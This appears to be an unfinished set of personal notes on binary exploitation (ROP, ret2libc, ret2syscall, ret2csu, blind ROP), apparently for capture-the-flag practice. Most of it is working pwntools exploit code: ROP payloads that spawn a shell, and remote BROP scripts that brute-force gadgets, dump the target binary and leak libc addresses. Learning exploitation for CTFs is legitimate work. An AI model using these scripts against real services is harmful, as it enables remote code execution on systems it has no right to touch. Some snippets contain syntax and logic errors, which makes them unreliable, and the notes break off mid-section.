
### in progress


# ROP
# how to find Gadgets (Ropper)

<details>
    <summary>Ropper</summary>
        <div>


read the docs!
https://github.com/sashs/Ropper

Ropper is a tool that can display information about binary files in different file formats and can search for gadgets to build rop chains for different architectures (x86/X86_64, ARM/ARM64, MIPS/MIPS64, PowerPC/PowerPC64, SPARC64).

most usefull commands imo.

`(ropper) file vuln_binary` loads the specified binary into cache and analyze it than cleans up double gadgets. \
`(ropper) search /1/ pop r??` /1/ = search for gadgets with max 1 instruction + ret  \
? means non specific char so this will search for `pop rax`&`pop rdi`&`pop rsi` and so on \
`(ropper) semantic eax==1 !ebx` searches for a gadget that set eax to 1 and does not clobber ebx

</div>
</details>

		
# find Strings in an ELF	
<details>
    <summary>strings</summary>
        <div>
		
searching manually   \
`strings -t x -a /path/to/binary | grep "string you searching"`

</div>
</details>
		
<details>
    <summary>pwntools</summary>
        <div>

in python script
```
binary = ELF('/path/to/binary')
stringaddr = next(binary.search(b'string you searching'))
```
</div>
</details>

# how to pivote the Stack
in progress
# ret2techniques
	
<details>
    <summary>ret2libc (dynamically linked ELF)</summary>
        <div>

# ret2libc (dynamically linked ELF)
to use ret2libc we need to know two things
	
1. the exact libc version the ELF uses
2. the base addr of libc in the process
		

to find the exact version of libc we can leak some GOT entrys which stores pointers to the functions in libc. 
(we also need this for finding the base of libc in the process)

since we have the ELF file we can do this with ease as the GOT and PLT sections are known to us (asuming PIE is off)
```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rdi)			#set first arg to the addr of puts@GOT
payload += p64(puts@GOT)		#addr puts@GOT
payload += p64(puts@PLT)		#call puts@PLT(puts@GOT)
```

this payload will print the libc addr of puts() in the current process.
puts_leak = `leaked addr here`

ok now ne know the exact addr of puts() in libc but we still dont know which libc version is used.
we will use a libc database like https://libc.blukat.me/ to find the exact version
libc.blukat will find the libc based of the last 3 nibbles of the leaked addr since these will always be the same 
		
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/libc_blukat.png">

usually you need to leak more than one libc function addr or the addr of a known string such as "/bin/sh" to find the exact libc version.

ok we now know the exact libc version now we can download the libc and calculate the offset from puts() to the base addr of libc in the process
use `vmmap` to find the libc base

```
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dbc000 0x00007ffff7de1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de1000 0x00007ffff7f59000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f59000 0x00007ffff7fa3000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa3000 0x00007ffff7fa4000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa4000 0x00007ffff7fa7000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fb0000 0x0000000000000000 rw- 
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

```

know_libc_base = `libc base here`		

offset = puts_leak - known_libc_base 		known_libc_base as it will change next time the ELF file is run (ASLR)
libc_base = puts_leak - offset

ok we now know the libc version and the exact libc_base inside the current process.
now we can use libc functions such as system("/bin/sh") we can setup the args and than simply call it from libc

1. setup the argument for system(pointer_binsh) 
2. call the libc function system()

```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rdi)			#set first arg to /bin/sh pointer
payload += p64(pointer_binsh)		#addr of /bin/sh\x00 in mem
payload += p64(system)			#call the libc system function
```

</div>
</details>

<details>
    <summary>ret2system (statically linked ELF)</summary>
        <div>


# ret2system (statically linked ELF)
`syscall(rax,rdi,rsi,rdx)`	
we want to call `execve(pointer_binsh,0,0)` to spawn a shell

so we need to setup a `syscall(execve(pointer_binsh,0,0))`
		
1. find the syscall number for execve
2. find a gadget that can write to a pointer like `mov [rdi],rdx`
3. write b'/bin/sh\x00' to a writable addr.
4. setup the registers and than syscall

syscall numbers `https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit	`
we know the syscall number is 0x3b so we want to call `syscall(0x3b,pointer_binsh,0,0)`
we need a gadget that can write to a pointer to write `/bin/sh\x00` string somewhere
we can find such a gadget by using `ropper`

```
ropper /1/ mov [r??],r??
```		
i choose `mov [rdi],rdx` ... somethink like `mov [rax],rdx` would worked too.
since we have to set rdi = pointer_binsh and `mov [rdi],rdx` directly writes to rdi we saved some gadgets.
when using `mov [rax],rdx` we have to `mov rdi,rax` afterwards.


```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rax)			#set rax to 0x3b
payload += p64(0x3b)
payload += p64(pop_rdi)			#set rdi to a .bss addr .bss is usually `rw-`
payload += p64(.bss)			#addr where we want to write to
payload += p64(pop_rdx)			#set rdx to `/bin/sh\x00`
payload += b`/bin/sh\x00`		#be carefull when you set this allways keep the 0x8 byte pad in mind e.g. when you want to call execve with `/bin/cat\x00`
payload += p64(write_gadget)		#writes the content of rdx = `/bin/sh\x00` into the addr rdi = `.bss` points to
payload += p64(pop_rsi)			#set rsi to 0
payload += p64(0x00)
payload += p64(pop_rdx)			#set rdx to 0
payload += p64(0x00)
payload += p64(syscall)				
```


</div>
</details>

<details>
    <summary>ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)</summary>
        <div>
		
# ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)

the `__libc_csu_init` function is responsible to initialize libc files.
in this function there are some interesting gadgets we can use.

first gadget let us controll some registers with pop

POPGADGET:
his will let us controllrbx,rbp,r12,r13,r14,r15
```
__libc_csu_init+90	POP        RBX
__libc_csu_init+91	POP        RBP
__libc_csu_init+92	POP        R12
__libc_csu_init+94 	POP        R13
__libc_csu_init+96	POP        R14
	        __libc_csu_init+98 	POP        R15
__libc_csu_init+100 	RET
```

CALLGADGET:
this will let us controll rdx,rsi and edi but we need to meet some conditions 
```         
__libc_csu_init+64	MOV        RDX,R14
__libc_csu_init+67 	MOV        RSI,R13
__libc_csu_init+70 	MOV        EDI,R12D
__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
__libc_csu_init+77	ADD        RBX,0x1
__libc_csu_init+81	CMP        RBP,RBX
__libc_csu_init+84	JNE        __libc_csu_init+64
__libc_csu_init+86	ADD        RSP,0x8
__libc_csu_init+90	POP        RBX
__libc_csu_init+91	POP        RBP
__libc_csu_init+92	POP        R12
__libc_csu_init+94 	POP        R13
__libc_csu_init+96	POP        R14
__libc_csu_init+98 	POP        R15
__libc_csu_init+100 	RET
```


there ase some constrains in the caller gadget 
1.
we want to pass the JNE and dont take it.
```
rbx = 0x00 set to 0 since it will be incremented later
rbp = set to 1 so when compared to the incremented rbx 
```

```
__libc_csu_init+77	ADD        RBX,0x1
__libc_csu_init+81	CMP        RBP,RBX
__libc_csu_init+84	JNE        __libc_csu_init+64
       	 	
```
2.
we want to set r15 = to a valide function pointer rbx will be 0x00
```
__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
```


```
putsgot = elf.got['puts']          
putsplt = elf.plt['puts']
pop_rdi = 0x00000000004011f3
pop_rsi_r15 = 0x00000000004011f1
ret = 0x4004e6

def ret2csu(call,rdi,rsi,rdx):
    payload = p64(0x4011ea)         # first call popper gadget

    payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
    payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx 
    payload += p64(0x400000)       # pop r12 #edi only 4 bytes controll
    payload += p64(rsi)            # pop r13 #rsi
    payload += p64(rdx)            # pop r14 #rdx
    payload += p64(putsgot)            # pop r15 

    payload += p64(0x4011d0)        # 2nd call caller gadget

        #__libc_csu_init+64     MOV        RDX,R14
        #__libc_csu_init+67     MOV        RSI,R13
        #__libc_csu_init+70     MOV        EDI,R12D

    payload += p64(0x00)            # add rsp,0x8 padding cause __libc_csu_init+86  ADD RSP,0x8 


        #__libc_csu_init+90     POP        RBX
        #__libc_csu_init+91     POP        RBP
        #__libc_csu_init+92     POP        R12
        #__libc_csu_init+94     POP        R13
        #__libc_csu_init+96     POP        R14
        #__libc_csu_init+98     POP        R15
        #__libc_csu_init+100    RET

    payload += p64(0x00)            # rbx
    payload += p64(0x00)            # rbp
    payload += p64(0x00)            # r12
    payload += p64(0x00)            # r13
    payload += p64(0x00)            # r14
    payload += p64(0x00)            # r15

        #__libc_csu_init+100    RET

    payload += p64(pop_rdi)        
    payload += p64(rdi)             # update rdi with correct unconstrained content
    payload += p64(pop_rsi_r15)     
    payload += p64(rsi)             # update rsi with correct unconstrained content
    payload += p64(0x00)

        #we now have this registers under controll rdi,rsi,rdx,rbx,rbp,r12,r13,r14,r15

    payload += p64(call)            # actual wanted function call
    return payload

    rop = b'A'*16
    rop += ret2csu(putsplt, 0x7ffff7f735aa, 0x00, 0x00) # call(rdi,rsi,rdx)

```

For de-randomizing libc, we can use &GOT_TABLE, coupled with some read(), write() or send(), recv() (ie: usually available in CTF challenges)

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2csu_gadgets.png">
		
</div>
</details>

# Blind Return Oriented Programming






<details>
    <summary>BROP (dont have the binary // PIE off // puts() in binary)</summary>
        <div>

# BROP (dont have the binary // PIE off // puts() in binary)
		
Steps of Exploitation:

Puts/Printf() when fd is 0,1,2 stdin,stdout,stderror
1. find a loop-gadget
2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
3. find puts@plt
4. leak the binary


### find loop-gadget
the example binary prints `Are you blind my friend?\n` and than asks us for input
so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again


```
def find_loop_gadget(i):
    
    r = remote(ip, port,timeout=1)
    
    addr_guess = i + 0x400200                         #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
        
    payload = b'A'*88                                 #pad
    payload += p64(addr_guess)                        #rip

    r.readuntil(b'Are you blind my friend?\n')        #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)


    try:
        check = r.recvline()                          #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:    #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr
            return int(addr_guess)              
        else:
            print(check)                              #if we recv something that is not 'Are you blind my friend?\n' we print to check what it was
            print(r.recvline())                       #than try to read more that should throw an EOF error if not inspect further
            r.close()
    except:
        print(sys.exc_info()[0])                      #prints the error
        print(i)                                      #prints the iterator
        r.close()


for i in range(0x2000):                               #loop  0x400200 -> 0x402200   
    loop = find_loop_gadget(i)                  
    if loop:                            
        print(f'found loop_gadget @ {hex(loop)}')
        break                                         #remove this break if you want to find more potential loop addr.
```



### find brop-gadget

ok we now have a loop-gadget now we need to find a brop-gadget (popper gadget from ret2csu)
6 pops in a row are pretty uncommon so its not hard to indentify it.


```
def find_brop_gadget(i):


    r = remote(ip, port,timeout=1)

    addr_guess = i + 0x400200                          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                                  #pad
    payload += p64(addr_guess)                         #rip 
    payload += p64(0x00)                               #setup stack
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(loop)                               #loop back to main

    r.recvuntil(b'Are you blind my friend?\n')         #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)

    try:
        check = r.recvline()                           #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:     #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr since our 6 pops goes throu
                                                       #2nd check if we are on the right gadget this time we want a crash
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                      #pad
                payload += p64(addr_guess)             #rip
                payload += p64(0x00)                   #setup stack
                payload += p64(0x00)    
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)                   # one extra 0x00 to crash. ret to 0x00 is allways a crash  
                payload += p64(loop)                   # if it still prints 'Are you blind my friend?\n' its the wrong guess addr
        
                p.recvuntil(b'Are you blind my friend?\n')     #read the first (intendet) "Are you blind my friend?\n" 
                p.send(payload)                 
                
                try:
                    check2 = p.recvline()              #try to read a line if we can read a line we are on the wrong addr guess #we should crash here
                    if check2:                         #if we can recv something addr guess are wrong
                    print('not passed check2')
                    p.close()
                    r.close()

                except:                                #we want a crash so if we crash were good
                    r.close()
                    p.close()
                    return addr_guess

        else:                                          #if we can recv something on the initial check but its not "Are you blind my friend?\n" or we hang
                r.close()                              #close connection
    except:                                            #if we crash during first payload wrong guess addr
        print(sys.exc_info()[0])
        r.close()


for i in range(0x2000):                                #loop  0x400200 -> 0x402200 
    brop = find_brop_gadget(i)
    if brop:
        print(f'found brop_gadget @ {hex(brop)}')
        break                                          #remove this break if you want to find more potential brop-gadget addr.
    

pop_rdi = int(brop) + 0x9                              #we need this later 
pop_rsi_r15 = int(brop) + 0x7                          #we need this later

```
### find puts-gadget



```
def find_puts(i):                        #puts@plt


    r = remote(ip, port,timeout=1)
                                                #iterate in steps of 0x10
    addr_guess = i*0x10 + 0x400200              #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers 



            #this is the plt layout we want to find
            # 0x0000000000400560  puts@plt
            # 0x0000000000400570  setbuf@plt
            # 0x0000000000400580  read@plt
            # 0x0000000000400590  __libc_start_main@plt
            # 0x00000000004005a0  strcmp@plt


    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #first argument for # int puts( char const * string ); puts(rdi) 
    payload += p64(0x400000)                    #points to 0x400000 which should print out 'ELF'
    payload += p64(addr_guess)                  #the addr guess for puts@plt

    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    


    try:
        check = r.recvline()                    #trys to recv if cant recv anything EOF error
        if b'ELF' in check:                     #if the str 'ELF' is in the check we found a potential puts@plt addr.
            r.close()
            return addr_guess
        else:
            print(check)                        #debugging if something weard was printed
    except:
        print(sys.exc_info()[0])                #printes the error
        print(i)                                #prints the iterator
        r.close()

for i in range(0x50):                           # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
    puts = find_puts(i)
    if puts:
        print(f'found puts @ {hex(puts)}')
        break                                   #remove this break if you want to find more potential puts@plt addr.
```

### leak the process with puts()
```
def leak_binary_puts(i,j):


    r = remote(ip, port,timeout=1)
    
    x = i + j

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(x)
    payload += p64(puts)

    r.recvline()                                         #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)



    try:
        check = r.recvline()                            #trys to recv the leak if nothin is recv inc offset by 1 and continue
        if check:
            if check.hex()[:-2] == '':                  
                file.append(b'\x00')
                r.close()
                return int(offset) + 1

            else:
                file.append(check[:-1])                 #append leak without \n
                last_len = int(len(check)-1)            #calculate len of leaked bytes
                r.close()
                return int(offset) + int(last_len)      #increase the offset by leaked num of bytes     
            
        else:
            r.close()
    except:                                             #inc offset by 1 and continue
        print(sys.exc_info()[0])
        r.close()
        return int(offset + 1)

file = []
last_len = 0
offset = 0

for i in range(0xb00):                      
    offset = leak_binary_puts(offset,0x400000)
    print(offset)
    print(f'{hex(i)}')


string1 = b''.join(file)

with open('binary_dump', 'wb') as out:
    out.write(string1)
    out.close()

```
find the libc verion with https://libc.blukat.me/

```           

def leak(i):        #simple leak function to find all GOT entrys this will print the addr and content of 0x601000 -> 0x601080 in steps of 0x8


    r = remote(ip, port,timeout=1)
    

    payload = b'A'*88                                                   
    payload += p64(pop_rdi)
    payload += p64(i)
    payload += p64(puts)

    r.recvline()                                        #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)

    leak = unpack(r.recvline()[:-1],'all')
    return leak


libc = ELF(/path/to/libc)                               #we want to guess a libc and if we guess right it should have the same last 3 nibbles 

puts_check = hex(libc.symbols['puts'])[-2::]

for i in range(0x10):                                   #loop 0x601000 -> 0x601080
    check = leak(0x601000+i*8)                          #GOT usually starts somewhere here 0x601000
    print(f'{hex(0x601000+i*8)} : {hex(check)}')
    if hex(check)[12:] == puts_check:
        putsgot = (i*8+0x601000)
        print(f'puts_got @ {hex(putsgot)}')
        break


```

and bringing it all together we can pop a shell

```
def pwn():

    #context.log_level = 'debug'

    r = remote(ip, port,timeout=1) 

    pop_rdi = int(brop) + 0x9
    ret = int(brop) + 10

    payload = b'A'*88                               #leak libc_base
    payload += p64(pop_rdi)
    payload += p64(putsgot)
    payload += p64(puts)
    payload += p64(loop)                            #loop back to main
 

    r.recvuntill('Are you blind my friend?\n')      #read the 1st (intendet) "Are you blind my friend?\n"
    r.send(payload)


    leak = unpack(r.recvline()[:-1],'all')          #leak puts
    print(hex(leak))
    libc.address = leak - libc.symbols['puts']      #sets libc base

    print(hex(libc.address))

    r.recvuntil('Are you blind my friend?\n')       #read the (loop) "Are you blind my friend?\n"

    binsh = next(libc.search(b'/bin/sh\x00'))       #ret2libc
    system = libc.symbols['system']

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    r.send(payload)

    inter()
```



</div>
</details>


<details>
    <summary>BROP (dont have the binary // PIE off // puts() not in binary)</summary>
        <div>

# BROP (dont have the binary // PIE off // puts() not in binary)		
		
1. find a loop-gadget
2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
3. find strcmp@PLT (strcmp sets rdx)
4. find write@PLT (let us write to any fd)
5. leak the binary

### find loop-gadget
the example binary prints `Are you blind my friend?\n` and than asks us for input
so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again


```
def find_loop_gadget(i):
    
    r = remote(ip, port,timeout=1)
    
    addr_guess = i + 0x400200                         #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
        
    payload = b'A'*88                                 #pad
    payload += p64(addr_guess)                        #rip

    r.readuntil(b'Are you blind my friend?\n')        #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)


    try:
        check = r.recvline()                          #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:    #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr
            return int(addr_guess)              
        else:
            print(check)                              #if we recv something that is not 'Are you blind my friend?\n' we print to check what it was
            print(r.recvline())                       #than try to read more that should throw an EOF error if not inspect further
            r.close()
    except:
        print(sys.exc_info()[0])                      #prints the error
        print(i)                                      #prints the iterator
        r.close()


for i in range(0x2000):                               #loop  0x400200 -> 0x402200   
    loop = find_loop_gadget(i)                  
    if loop:                            
        print(f'found loop_gadget @ {hex(loop)}')
        break                                         #remove this break if you want to find more potential loop addr.
```



### find brop-gadget

ok we now have a loop-gadget now we need to find a brop-gadget (popper gadget from ret2csu)
6 pops in a row are pretty uncommon so its not hard to indentify it.


```
def find_brop_gadget(i):


    r = remote(ip, port,timeout=1)

    addr_guess = i + 0x400200                          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                                  #pad
    payload += p64(addr_guess)                         #rip 
    payload += p64(0x00)                               #setup stack
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(loop)                               #loop back to main

    r.recvuntil(b'Are you blind my friend?\n')         #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)

    try:
        check = r.recvline()                           #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:     #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr since our 6 pops goes throu
                                                       #2nd check if we are on the right gadget this time we want a crash
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                      #pad
                payload += p64(addr_guess)             #rip
                payload += p64(0x00)                   #setup stack
                payload += p64(0x00)    
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)                   # one extra 0x00 to crash. ret to 0x00 is allways a crash  
                payload += p64(loop)                   # if it still prints 'Are you blind my friend?\n' its the wrong guess addr
        
                p.recvuntil(b'Are you blind my friend?\n')     #read the first (intendet) "Are you blind my friend?\n" 
                p.send(payload)                 
                
                try:
                    check2 = p.recvline()              #try to read a line if we can read a line we are on the wrong addr guess #we should crash here
                    if check2:                         #if we can recv something addr guess are wrong
                    print('not passed check2')
                    p.close()
                    r.close()

                except:                                #we want a crash so if we crash were good
                    r.close()
                    p.close()
                    return addr_guess

        else:                                          #if we can recv something on the initial check but its not "Are you blind my friend?\n" or we hang
                r.close()                              #close connection
    except:                                            #if we crash during first payload wrong guess addr
        print(sys.exc_info()[0])
        r.close()


for i in range(0x2000):                                #loop  0x400200 -> 0x402200 
    brop = find_brop_gadget(i)
    if brop:
        print(f'found brop_gadget @ {hex(brop)}')
        break                                          #remove this break if you want to find more potential brop-gadget addr.
    

pop_rdi = int(brop) + 0x9                              #we need this later 
pop_rsi_r15 = int(brop) + 0x7                          #we need this later

```

```
def find_strcmp(i):
    
    r = remote(ip, port,timeout=1)
                                                #iterate in steps of 0x10 same as finding puts
    addr_guess = i*0x10 + 0x400200                    #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #pop 1st argument for # int strcmp (const char* str1, const char* str2); strcmp(rdi,rsi)
    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
    payload += p64(pop_rsi_r15)                 #pop 2nd argument   
    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
    payload += p64(0x00)                        #junk to fill r15
    payload += p64(addr_guess)                  #the addr guess for strcmp@plt
    payload += p64(loop)                        #loop back to main if check for GOOD:GOOD pointers work 
    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    

    try:
        check = r.recvline()                                            #trys to recv if cant recv anything EOF error
        if b'Are you blind my friend?\n' in check:                      #if we can find 'Are you blind my friend?\n' we passed check1 
            r.close()
            print('\n1st check passed good:good')
            
            print(f'2nd check for {hex(addr_guess)} good:bad')
            p = remote(ip,port,timeout=1)

            payload = b'A'*88                                           #same as above but with GOOD:BAD pointers that should crash
            payload += p64(pop_rdi) 
            payload += p64(0x400000)                                    #holds valide pointer to 'ELF'          GOOD
            payload += p64(pop_rsi_r15)
            payload += p64(0x0)                                         #holds invalide pointer to 0x00         BAD
            payload += p64(0x0)
            payload += p64(addr_guess)
            payload += p64(loop)        
            p.readuntil('Are you blind my friend?\n')
            p.send(payload)
                
            try:
                check2 = p.recvline()

                if check2: 
                    print('not passed check2')
                    p.close()
                else:
                    print('not passed check2')
                    p.close()

            except:
                r.close()
                p.close()
                print(f'3nd check for {hex(addr_guess)} bad:good')
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                                       #same as above but with BAD:GOOD pointers that should crash    
                payload += p64(pop_rdi)
                payload += p64(0x0)                                     #holds invalide pointer to 0x00         BAD
                payload += p64(pop_rsi_r15)
                payload += p64(0x400000)                                #holds valide pointer to 'ELF'          GOOD
                payload += p64(0x0)
                payload += p64(addr_guess)
                payload += p64(loop)         
                p.readuntil('Are you blind my friend?\n')
                p.send(payload)

                try:
                    check3 = p.recvline()

                    if check3: 
                        print('not passed check3')
                        p.close()
                    else:
                        print('not passed check3')
                        p.close()

                except:
                    p.close()
                    print(f'4rd check for {hex(addr_guess)} bad:bad')
                    p = remote(ip,port,timeout=1)

                    payload = b'A'*88                                   #same as above but with BAD:BAD pointers that should crash
                    payload += p64(pop_rdi) 
                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
                    payload += p64(pop_rsi_r15)
                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
                    payload += p64(0x0)             
                    payload += p64(addr_guess)
                    payload += p64(loop)         
                    p.readuntil('Are you blind my friend?\n')
                    p.send(payload)
                    try:
                        check4 = p.recvline()

                        if check4: 
                            print('not passed check4')
                            p.close()

                        else:
                            print('not passed check4')
                            p.close()


                    except:
                        p.close()
                        print(sys.exc_info()[0])
                        return addr_guess                               #if all checks were good we return the guess_addr

        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        print(hex(addr_guess))
        r.close()


for i in range(0x50):                                                   # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
        strcmp = find_strcmp(i)
        if strcmp:
            print(f'found strcmp @ {hex(strcmp)}')
            break                                                       #remove this break if you want to find more potential strcmp@plt addr.

 ```

 ```
def find_write()                                #ssize_t write(int fd, const void *buf, size_t count); write(rdi,rsi,rdx)

    r = remote(ip, port,timeout=1)  


    pop_rdi = int(brop) + 0x9                    
    pop_rsi_r15 = int(brop) + 0x7


                                                #iterate in steps of 0x10
    addr_guess = i*0x10 + 0x400200              #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers 

    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
    payload += p64(0x400000)                    #rdi points to 0x400000 which should hold 'ELF'
    payload += p64(pop_rsi_r15)
    payload += p64(0x400000)                    #rsi points to 0x400000 which should hold 'ELF'
    payload += p64(0x00)                        #junk r15
    payload += p64(strcmp)                      #sets rdx to != 0x00
    payload += p64(pop_rdi)
    payload += p64(0x01)                        #fd for write usually 0x01 but when we connect throu a socket maybe differ
    payload += p64(addr_guess)
                                                


    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    


    try:
        check = r.recvline()                    #trys to recv if cant recv anything EOF error
        if b'ELF' in check:                     #if the str 'ELF' is in the check we found a potential write@plt addr.
            r.close()
            return addr_guess
        else:
            print(check)                        #debugging if something weard was printed
    except:
        print(sys.exc_info()[0])                #printes the error
        print(i)                                #prints the iterator
        r.close()

for i in range(0x50):                           # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
    write = find_write(i)
    if write:
        print(f'found write @ {hex(write)}')
        break                                   #remove this break if you want to find more potential write@plt addr.
 ```

 
### leak the process with write()
		
```
def leak_binary_write(i,j):

    pop_rdi = int(brop) + 0x9                    
    pop_rsi_r15 = int(brop) + 0x7

    r = remote(ip, port,timeout=1)
    
    x = i + j

    payload = b'A'*88                                   #pad
    payload += p64(pop_rdi)                             #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
    payload += p64(0x400000)                            #rdi points to 0x400000 which should hold '0x00010102464c457f'
    payload += p64(pop_rsi_r15)
    payload += p64(0x400001)                            #rsi points to 0x400001 which should hold '0x0000010102464c45'
    payload += p64(0x00)                                #junk r15
    payload += p64(strcmp)                              #sets rdx to 0x7f

    payload += p64(pop_rdi)
    payload += p64(0x01)                                #fd for write usually 0x01 but when we connect throu a socket maybe differ
    payload += p64(pop_rsi_r15)
    payload += p64(x)                                   #addr to leak
    payload += p64(0x00)                                #junk r15   
    payload += p64(addr_guess)                          #ssize_t write(int fd, const void *buf, size_t count); write(rdi,rsi,rdx)

    r.recvline()                                        #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)



    try:
        check = r.recvline()                            
        if check:
            file.append(check[:-1])
            r.close() 
            
        else:
            r.close()
    except:                                             
        print(sys.exc_info()[0])
        r.close()


file = []
offset = 0x7f                                           

for i in range(0x100):                      
    offset = leak_binary_write(i*offset,0x400000)
    print(f'{hex(i*offset)}')


string1 = b''.join(file)

with open('binary_dump', 'wb') as out:
    out.write(string1)
    out.close()

```

</div>
</details>


# ret2dl_resolve
https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf
<details>
    <summary>how _dl_runtime_resolve works </summary>
        <div>

		
# how _dl_runtime_resolve works

```
_dl_runtime_resolve(elf_info , index )
				|
				|
  ------------------------------
  |
  |	 ___________________          ___________________          ___________________
  |	| Relocation table  |        |   Symbol table    |        |   String table    |
  |	|_____rel.plt_______|        |_____.dynsym_______|        |______.dynstr______|
